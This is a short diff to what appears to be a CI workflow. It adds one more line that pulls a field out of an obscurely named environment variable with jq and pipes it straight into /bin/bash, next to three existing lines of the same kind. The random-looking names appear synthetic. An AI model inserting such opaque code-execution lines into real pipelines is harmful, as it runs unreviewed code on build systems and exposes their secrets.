@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$walr54" | jq -r .zi09 | /bin/bash
           printf '%s' "$pkp7474" | jq -r .s0 | /bin/bash
           printf '%s' "$l0" | jq -r .j99 | /bin/bash
+          echo $vrt5494 | jq -r .zpuwm46147 | /bin/bash
 
       - name: Archive results
         if: always()
